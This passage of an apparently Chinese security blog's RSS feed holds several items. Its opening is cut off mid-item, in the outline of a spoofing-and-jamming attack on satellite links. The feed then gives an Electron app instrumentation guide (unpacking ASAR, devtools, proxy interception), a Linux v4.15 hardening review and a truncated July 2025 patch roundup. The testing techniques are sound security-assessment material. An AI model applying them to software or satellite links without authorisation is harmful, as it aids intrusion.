&lt;li&gt;&lt;strong&gt;第一阶段&lt;/strong&gt;：欺骗攻击劫持下行链路（卫星→地面）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;第二阶段&lt;/strong&gt;：干扰攻击阻断上行链路（地面→卫星）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;最终效果&lt;/strong&gt;：完全控制卫星通信信道&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;防御现状警示&#34;&gt;防御现状警示
&lt;/h2&gt;&lt;p&gt;对17种卫星型号的调研显示：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;18% (3/17) 完全无防护措施&lt;/li&gt;
&lt;li&gt;29% (5/17) 拒绝说明防护情况&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;ldquo;当前卫星安全最大隐患在于工程师过度依赖&amp;rsquo;隐蔽即安全&amp;rsquo;的错误假设&amp;rdquo; —— ICSS课程导师Tim Fowler&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;完整攻击演示及防御方案详见&lt;a class=&#34;link&#34; href=&#34;https://www.antisyphontraining.com/icss&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;空间系统网络安全入门课程&lt;/a&gt;。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Electron应用安全测试工具化指南</title>
        <link>http://localhost:1313/p/electron%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%8C%96%E6%8C%87%E5%8D%97/</link>
        <pubDate>Sun, 03 Aug 2025 10:18:30 +0800</pubDate>
        
        <guid>http://localhost:1313/p/electron%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%8C%96%E6%8C%87%E5%8D%97/</guid>
        <description>&lt;h1 id=&#34;electron应用安全测试工具化指南&#34;&gt;Electron应用安全测试工具化指南
&lt;/h1&gt;&lt;p&gt;随着Electron框架的流行，我们总结了以下技术手段用于对Electron应用进行工具化改造、行为修改和深度安全评估。&lt;/p&gt;
&lt;h2 id=&#34;electron进程架构&#34;&gt;Electron进程架构
&lt;/h2&gt;&lt;p&gt;Electron框架使用HTML、JavaScript和CSS开发跨平台桌面应用，其核心由Node.js和Chromium的libchromiumcontent模块组成。主进程运行package.json的主脚本，负责启动其他进程；渲染进程则用于显示网页内容。&lt;/p&gt;
&lt;h2 id=&#34;解包asar存档&#34;&gt;解包ASAR存档
&lt;/h2&gt;&lt;p&gt;首先需要解压应用的.asar文件：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;npm install -g asar
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;asar extract core.asar destinationfolder
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;典型的Electron应用包含index.js、index.html和package.json三个文件，其中package.json指定了应用入口文件。&lt;/p&gt;
&lt;h2 id=&#34;处理混淆代码&#34;&gt;处理混淆代码
&lt;/h2&gt;&lt;p&gt;对于未混淆代码可直接分析，如遇混淆代码需结合工具和手工逆向：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// 混淆代码示例
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;/*...*/&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;/*...*/&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;\\x62\\x20\\x35...&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x28&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x28&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,...));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// 反混淆后
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;NewObject&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;contentsOfMyTextFile&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;_1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;SayHello&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;theLibrary&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;_1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;alert&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;contentsOfMyTextFile&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;theLibrary&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;启用渲染进程开发者工具&#34;&gt;启用渲染进程开发者工具
&lt;/h2&gt;&lt;p&gt;在主进程创建BrowserWindow时添加：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;win&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;webContents&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;openDevTools&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;({&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;mode&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;bottom&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;})&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;win&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;setMenuBarVisibility&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;调试主进程&#34;&gt;调试主进程
&lt;/h2&gt;&lt;p&gt;使用以下命令启动应用进行调试：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;electron --inspect&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;5858&lt;/span&gt; your-app
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;然后通过Chrome访问chrome://inspect进行调试。&lt;/p&gt;
&lt;h2 id=&#34;拦截https流量&#34;&gt;拦截HTTP(S)流量
&lt;/h2&gt;&lt;p&gt;可通过以下方式设置代理：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;app&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;commandLine&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;appendSwitch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;proxy-server&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;127.0.0.1:8080&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;对于Node.js环境：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;npm config &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; proxy http://localhost:8080
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;npm config &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; https-proxy http://localhost:8081
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;安全建议&#34;&gt;安全建议
&lt;/h2&gt;&lt;p&gt;完整的测试需要结合静态代码审查、动态测试和客户端工具化技术，通过全面覆盖代码路径来发现潜在漏洞。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Linux内核v4.15安全技术深度解析</title>
        <link>http://localhost:1313/p/linux%E5%86%85%E6%A0%B8v4.15%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/</link>
        <pubDate>Sun, 03 Aug 2025 10:07:35 +0800</pubDate>
        
        <guid>http://localhost:1313/p/linux%E5%86%85%E6%A0%B8v4.15%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/</guid>
        <description>&lt;h1 id=&#34;linux内核v415安全技术解析&#34;&gt;Linux内核v4.15安全技术解析
&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;发布日期&lt;/strong&gt;：2018年2月5日&lt;br&gt;
&lt;strong&gt;分类&lt;/strong&gt;：Chrome OS, Debian, 内核, 安全, Ubuntu, Ubuntu-Server&lt;/p&gt;
&lt;p&gt;[前情提要：v4.14版本]&lt;/p&gt;
&lt;p&gt;上周发布的Linux内核v4.15包含多项重要安全改进：&lt;/p&gt;
&lt;h2 id=&#34;内核页表隔离pti&#34;&gt;内核页表隔离(PTI)
&lt;/h2&gt;&lt;p&gt;虽然PTI已获广泛报道，但简而言之，它主要用于防御CPU缓存时序侧信道攻击（CVE-2017-5754，即推测执行的&amp;quot;恶意数据缓存加载&amp;quot;或&amp;quot;Meltdown&amp;quot;漏洞）。x86_64架构（通过CONFIG_PAGE_TABLE_ISOLATION配置）的PTI实现涉及大量工作，数十人参与开发数月。PowerPC也已加入缓解措施，arm64（通过CONFIG_UNMAP_KERNEL_AT_EL0配置）将在v4.16支持PTI（仅Cortex-A75受影响）。x86_32架构的支持正在开发中。&lt;/p&gt;
&lt;p&gt;x86_64 PTI的额外优势是：由于现在存在两份页表副本，内核模式的用户空间映射可完全标记为不可执行，这意味着前SMEP硬件现在获得SMEP模拟功能。试图跳转到用户空间内存继续执行恶意代码的内核攻击将失效（即使攻击者先关闭了SMEP）。通过进一步工作，还可引入SMAP模拟（阻止读取恶意用户空间内存），从而关闭这些常见攻击向量。值得注意的是，arm64自v4.10起就具备等效功能（PAN模拟）。&lt;/p&gt;
&lt;h2 id=&#34;retpoline防御机制&#34;&gt;Retpoline防御机制
&lt;/h2&gt;&lt;p&gt;除PTI外，针对CVE-2017-5715（&amp;ldquo;分支目标注入&amp;quot;或&amp;quot;Spectre变种2&amp;rdquo;）的retpoline内核缓解措施开始落地。（注意：要获得完整retpoline支持，需要打补丁的编译器，如gcc 7.3/8+版本，目前clang也已排队等待发布。）&lt;/p&gt;
&lt;p&gt;这项工作仍在演进，清理工作将持续到v4.16。v4.16还将包含针对其他推测执行变种（CVE-2017-5753，&amp;ldquo;边界检查绕过&amp;quot;或&amp;quot;Spectre变种1&amp;rdquo;）的缓解措施。&lt;/p&gt;
&lt;h2 id=&#34;x86快速refcount_t溢出保护&#34;&gt;x86快速refcount_t溢出保护
&lt;/h2&gt;&lt;p&gt;v4.13引入了CONFIG_REFCOUNT_FULL代码来阻止多种引用计数缺陷（伴随微小性能损失）。v4.14为x86快速溢出专用refcount_t保护（基于grsecurity的PAX_REFCOUNT）奠定了基础，但因bug推迟到v4.15修复。由于改动很小，快速refcount_t保护已反向移植并在长期维护内核v4.14.5中启用。从atomic_t到refcount_t的转换持续进行，目前已超过168处，仅剩少量待转换。&lt;/p&gt;
&lt;h2 id=&#34;p地址哈希化&#34;&gt;%p地址哈希化
&lt;/h2&gt;&lt;p&gt;内核信息泄露的众多来源之一是%p格式说明符。这些字符串最终出现在各种位置（dmesg、/sys文件、/proc文件等），且使用分散在整个内核中，使其成为难以修复的泄露源。早期像kptr_restrict的%pK这样的方案效果有限，因为它是选择加入的。虽然最近有人尝试（如William C Roberts、Greg KH等）提供让%p像%pK一样工作的开关，但Linus最终介入并声明%p应该极少使用以至于根本不该使用。Tobin Harding承担了寻找正确路径的任务，最终实现用每启动随机密钥对%p输出进行哈希处理。结果是简单调试仍可工作（相同哈希值的两个报告可以确认相同地址而不泄露实际地址），但阻碍了攻击者利用此类信息泄露作为漏洞利用构建块的能力。&lt;/p&gt;
&lt;p&gt;对于需要未哈希%p的开发者，引入了%px，但如Linus警告：要么你的%p在哈希后仍有用，要么你的%p原本就无用应该删除，要么你需要用合理权限充分证明使用%px的正当性。&lt;/p&gt;
&lt;h2 id=&#34;timer_list结构重构&#34;&gt;timer_list结构重构
&lt;/h2&gt;&lt;p&gt;内核定时器（struct timer_list）基础设施用于创建在特定时间后执行的回调。作为内核更基础的部分之一，它已存在很长时间，有超过1000个调用点。虽然API随时间改进，但旧方式仍然存在。现代内核回调接收指向与回调关联结构的参数，以便回调知道哪个实例被触发。定时器回调没有这样做，而是接收unsigned long参数，该参数被强制转换回代码设置定时器时想要关联回调的任何上下文，并且该变量与回调函数指针一起存储在struct timer_list中。这为试图利用内存破坏漏洞（如堆溢出）的攻击者创造了机会，他们不仅能覆盖函数指针，还能覆盖内存中存储的参数。这将攻击提升为弱ROP，并已被用作现代漏洞利用中禁用SMEP的基础（参见retire_blk_timer）。为消除内核设计中的这一弱点，我重构了定时器回调API及其所有调用者，改动规模达：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;1128 files changed, 4834 insertions(+), 5926 deletions(-)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;重构的另一好处是：一旦内核开始由支持控制流完整性(CFI)的编译器构建，定时器回调将不会与所有其他接收单个unsigned long参数的函数混为一谈。（换句话说，某些CFI实现不会捕获上述攻击，因为攻击者的目标函数仍匹配其原始原型。）&lt;/p&gt;
&lt;p&gt;目前就这些；如有遗漏请告知。v4.16合并窗口现已开启！&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;评论精选&lt;/strong&gt;：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;Nick提问&lt;/strong&gt;：关于KPTI，是否建议为AMD CPU启用？特别是考虑到KPTI本应更好地保护KASLR，而且用户空间和内核空间的分离本质上更好，尽管有性能损失。&lt;br&gt;
&lt;strong&gt;kees回复&lt;/strong&gt;：对于没有SMEP的CPU，我建议无条件保持KPTI开启。对于SMEP机器，我仍会启用它，因为它为各种缓存时序攻击（包括许多常见的KASLR泄漏）提供了良好的隔离。最终取决于你的工作负载。如果能承受微小性能变化，就启用它。&lt;br&gt;
&lt;strong&gt;Nick补充&lt;/strong&gt;：这也是我的第一想法，在安全方面不做半吊子措施。即使AMD CPU默认排除在KPTI之外。可以预期未来会有进一步优化来减少KPTI性能损失。&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;许可声明&lt;/strong&gt;：本文采用知识共享署名-相同方式共享4.0国际许可协议授权。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>2025年7月安全更新深度解析：微软与Adobe关键漏洞修复指南</title>
        <link>http://localhost:1313/p/2025%E5%B9%B47%E6%9C%88%E5%AE%89%E5%85%A8%E6%9B%B4%E6%96%B0%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E5%BE%AE%E8%BD%AF%E4%B8%8Eadobe%E5%85%B3%E9%94%AE%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E6%8C%87%E5%8D%97/</link>
        <pubDate>Sun, 03 Aug 2025 09:56:14 +0800</pubDate>
        
        <guid>http://localhost:1313/p/2025%E5%B9%B47%E6%9C%88%E5%AE%89%E5%85%A8%E6%9B%B4%E6%96%B0%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E5%BE%AE%E8%BD%AF%E4%B8%8Eadobe%E5%85%B3%E9%94%AE%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E6%8C%87%E5%8D%97/</guid>
        <description>&lt;h1 id=&#34;2025年7月安全更新综述&#34;&gt;2025年7月安全更新综述
&lt;/h1&gt;&lt;p&gt;2025年7月8日 | Dustin Childs&lt;/p&gt;
&lt;p&gt;每月第二个星期二，Adobe和微软如期发布了最新安全补丁。本文将详细分析这两家公司的安全更新内容。&lt;/p&gt;
&lt;h2 id=&#34;adobe-2025年7月补丁&#34;&gt;Adobe 2025年7月补丁
&lt;/h2&gt;&lt;p&gt;本月Adobe共发布13个公告，修复了ColdFusion、After Effects等产品中的60个独特CVE漏洞：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;ColdFusion&lt;/strong&gt;：优先级1的更新，修复13个CVE（5个关键级），建议考虑迁移到现代替代方案&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;FrameMaker&lt;/strong&gt;：修复15个CVE（13个可导致代码执行的关键漏洞）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Illustrator&lt;/strong&gt;：修复10个漏洞，最严重者可导致代码执行&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;其他产品&lt;/strong&gt;：包括After Effects（2个重要漏洞）、Substance 3D Viewer（1关键+2重要漏洞）、InDesign（6个关键漏洞）等&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;所有漏洞在发布时均未被公开披露或检测到主动攻击。除ColdFusion外，所有更新部署优先级均为3级。&lt;/p&gt;
&lt;h2 id=&#34;微软2025年7月补丁&#34;&gt;微软2025年7月补丁
&lt;/h2&gt;&lt;p&gt;微软本月共发布130个新CVE，涉及：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Windows及组件&lt;/li&gt;
&lt;li&gt;Office及组件&lt;/li&gt;
&lt;li&gt;.NET和Visual Studio&lt;/li&gt;
&lt;li&gt;Azure&lt;/li&gt;
&lt;li&gt;Teams&lt;/li&gt;
&lt;li&gt;Hyper-V&lt;/li&gt;
&lt;li&gt;BitLocker&lt;/li&gt;
&lt;li&gt;Edge浏览器等&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;其中10个被评为关键级，120个为重要级。值得关注的高危漏洞包括：&lt;/p&gt;
&lt;h3 id=&#34;关键漏洞&#34;&gt;关键漏洞
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;CVE-2025-47981&lt;/strong&gt;：SPNEGO扩展协商安全机制RCE漏洞（蠕虫级，最高可利用指数）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;CVE-2025-49717&lt;/strong&gt;：SQL Server堆缓冲区溢出RCE（需更新OLE DB驱动）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;CVE-2025-49704&lt;/strong&gt;：SharePoint RCE（源自Pwn2Own柏林比赛）&lt;/li&gt;
